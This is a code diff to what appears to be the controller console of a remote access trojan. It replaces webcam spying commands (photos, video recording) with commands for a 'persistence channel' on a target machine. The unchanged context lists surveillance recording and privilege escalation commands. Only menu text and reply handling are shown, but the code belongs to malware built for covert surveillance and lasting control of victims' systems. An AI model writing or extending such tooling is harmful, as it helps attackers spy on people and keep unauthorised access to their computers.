@@ -84,12 +84,11 @@ def target_communication():
     print("   stop_recording         - Stop surveillance")
     print("   list_recordings        - List recorded files")
     print("")
-    print("CAMERA COMMANDS:")
-    print("   camera_photo           - Take photo from camera")
-    print("   start_camera_recording - Start camera video recording")
-    print("   stop_camera_recording  - Stop camera recording")
-    print("   camera_status          - Get camera system status")
-    print("   list_camera_recordings - List camera recordings")
+    print("PERSISTENCE COMMANDS:")
+    print("   start_persist          - Start persistence channel")
+    print("   stop_persist           - Stop persistence channel")
+    print("   persist_status         - Get persistence status")
+    print("   persist_info           - Show detailed connection info")
     print("")
     print("[NOT WORKING] PRIVILEGE ESCALATION:")
     print("   check_privs            - Check current privileges")
@@ -167,21 +166,21 @@ def target_communication():
                 print(f"Recording: {result}")
             elif command == 'list_recordings':
                 print(f"Recordings:\n{result}")
-        elif command in ['camera_photo', 'start_camera_recording', 'stop_camera_recording', 'camera_status', 'list_camera_recordings']:
-            # Handle camera commands
+        elif command in ['start_persist', 'stop_persist', 'persist_status', 'persist_info']:
+            # Handle persistence commands
             result = reliable_recv()
-            if command == 'camera_photo':
-                print(f"Camera Photo: {result}")
-            elif command == 'start_camera_recording':
-                print(f"Camera Recording: {result}")
-            elif command == 'stop_camera_recording':
-                print(f"Camera: {result}")
-            elif command == 'camera_status':
-                print(f"Camera Status:\n{'-'*40}")
+            if command == 'start_persist':
+                print(f"Persistence: {result}")
+            elif command == 'stop_persist':
+                print(f"Persistence: {result}")
+            elif command == 'persist_status':
+                print(f"Persistence Status:\n{'-'*40}")
                 print(result)
                 print("-"*40)
-            elif command == 'list_camera_recordings':
-                print(f"Camera Recordings:\n{result}")
+            elif command == 'persist_info':
+                print(f"Persistence Info:\n{'-'*40}")
+                print(result)
+                print("-"*40)
         elif command in ['check_privs', 'escalate', 'privesc_report']:
             # Handle privilege escalation commands
             result = reliable_recv()
